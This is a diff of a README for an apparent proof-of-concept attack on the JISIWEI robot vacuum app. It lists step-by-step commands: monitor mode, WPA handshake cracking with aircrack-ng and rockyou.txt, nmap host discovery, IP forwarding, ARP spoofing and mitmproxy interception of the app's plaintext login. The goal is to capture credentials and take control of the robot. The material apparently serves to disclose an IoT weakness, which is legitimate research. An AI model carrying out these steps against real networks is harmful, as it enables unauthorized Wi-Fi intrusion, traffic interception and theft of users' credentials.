@@ -2,7 +2,7 @@
 
 ## Setup
 A computer with these tools have to be fixed:
-- **Android Emulator** or **Smartphone**, with the JISIWEI application installed
+- **Android Emulator** or **Smartphone**, with the JISIWEI application installed. iOS app can be found here: https://apps.apple.com/us/app/极思维机器人/id937665306 and the APK file for the Android app is found in this repository.
 - **aircrack-ng**, used for getting in to the network.
 - **mitmproxy**, runned in transparent mode. Used for seeing the HTTP requests.
 - **arpspoof**, for spoofing the network to get the packets.
@@ -13,15 +13,13 @@ A computer with these tools have to be fixed:
 ## Step 1
 Use Aircrack-ng with the wireless network adapter to crack the password to the router.
 
-But first we have to set the wireless adapter to monitor mode:
+But first we have to set the wireless adapter to monitor mode, Either run the script **monitor_mode.sh** or do the following:
+:
 ```
+rfkill unblock all
 ifconfig wlan0 down
 iwconfig wlan0 mode monitor
 ifconfig wlan0 up
-```
-If you would get the error message **SIOCSIFFLAGS: Operation not possible due to RF-kill**, do the following:
-```
-rfkill unblock all
 ```
 
 We can then check what networks are available in the area:
@@ -49,7 +47,7 @@ Now use aircrack-ng with a password list and get the password.
 aircrack-ng -w rockyou.txt -b [BSSID of wifi] psk*.cap
 ```
 
-Now you can set the mode for the wireless adapter to Auto and then login to the wifi.
+Now you can set the mode for the wireless adapter to Auto and then login to the wifi. Either run the script auto_mode.sh or do the following:
 
 ```
 ifconfig wlan0 down
@@ -64,13 +62,13 @@ Use Nmap to see the devices in the network.
 ```
 nmap -sn 192.168.1.127/24
 ```
-Check ports on all the devices found in the network.
-
-Show the Jisiwei device.
+Check ports on all the devices found in the network. We will need the router and a phone.
 
 
 ## Step 3
-First we will setup portforwarding before using arpspoof and mitmproxy:
+Either run the script **spoof.sh** or do all the steps down below.
+
+First we will setup port forwarding before using arpspoof and mitmproxy:
 
 ```
 sysctl -w net.ipv4.ip_forward=1
@@ -97,7 +95,13 @@ Use the emulator or smartphone and log in to the JISIWEI application while on th
 /root/Android/Sdk/emulator/emulator -avd Attacker 
 ```
 
-Get the credentials from the login HTTP request in mitmproxy.
+Use the credentials:
+
+username: hackmanhacker9@gmail.com
+
+password: proofofconcept
+
+When you have logged in you can see the credentials in the HTTP request. Meaning that the attacker now has access to those credentials and is now able to login to the app and controll the vacuum cleaner robot.
 
 ## Step 4
 
